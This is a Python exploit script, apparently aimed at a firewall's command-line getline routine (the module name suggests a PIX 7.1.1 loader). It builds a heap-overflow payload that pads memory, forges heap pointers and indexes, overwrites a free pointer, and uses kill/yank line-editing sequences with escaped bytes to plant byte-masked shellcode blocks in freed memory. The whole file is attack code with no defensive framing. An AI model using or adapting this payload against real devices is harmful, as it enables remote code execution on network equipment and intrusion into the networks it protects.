from params import *
from util import *
from pix711_loader import *


def payload(params):
    block_enc = []
    while len(block_enc) == 0:
        mask_byte = ord(rand_byte())  # one byte, used as an int
        #print "trying to mask data with 0x%02x" % mask_byte

        block_enc = prepare_blocks(params, mask_byte,
                                   block1_decoder, cleanup, block_decoder, blocks_table, epba_exit,
                                   free_addrs, block)
        if block_enc == False:
            print "failed to prepare blocks!"
            return ""


    # prepare the payload
    payload = ""
    # drop 460 bytes for overflow to offset 1224 in getline
    # sequence is K-Y-Y-Y
    # 15 blocks of free memory, 13 for code
    payload += ctrl_v_escape("\x01" * 336)
    payload += ctrl_v_escape(valid_prev)     # new prev
    payload += ctrl_v_escape(neg_index)      # -20
    payload += ctrl_v_escape(neg_index)      # -20
    payload += ctrl_v_escape(free_addrs[0])  # where blob drops
    payload += ctrl_v_escape(free_addrs[1])  # first real code drops here
    payload += ctrl_v_escape(free_addrs[2])
    payload += ctrl_v_escape(free_addrs[3])
    payload += ctrl_v_escape(free_addrs[4])
    payload += ctrl_v_escape(free_addrs[5])
    payload += ctrl_v_escape(free_addrs[6])
    payload += ctrl_v_escape(free_addrs[7])
    payload += ctrl_v_escape(free_addrs[8])
    payload += ctrl_v_escape(free_addrs[9])
    payload += ctrl_v_escape(free_addrs[10])
    payload += ctrl_v_escape(free_addrs[11])
    payload += ctrl_v_escape(free_addrs[12])
    payload += ctrl_v_escape(free_addrs[13]) # last real code
    payload += ctrl_v_escape(free_addrs[14]) # overwrite the free ptr
    payload += ctrl_v_escape("\x01" * 52)

    payload += OVERWRITE + KILL + (YANK * 3) + LINEFEED

    payload += ctrl_v_escape(block_enc[1]) + LINEFEED
    payload += ctrl_v_escape(block_enc[2]) + LINEFEED
    payload += ctrl_v_escape(block_enc[3]) + LINEFEED
    payload += ctrl_v_escape(block_enc[4]) + LINEFEED
    payload += ctrl_v_escape(block_enc[5]) + LINEFEED
    payload += ctrl_v_escape(block_enc[6]) + LINEFEED
    payload += ctrl_v_escape(block_enc[7]) + LINEFEED
    payload += ctrl_v_escape(block_enc[8]) + LINEFEED
    payload += ctrl_v_escape(block_enc[9]) + LINEFEED
    payload += ctrl_v_escape(block_enc[10]) + LINEFEED
    payload += ctrl_v_escape(block_enc[11]) + LINEFEED
    payload += ctrl_v_escape(block_enc[12]) + LINEFEED
    payload += ctrl_v_escape(block_enc[13]) + LINEFEED
    payload += ctrl_v_escape(block_enc[14]) + LINEFEED

    return(payload)
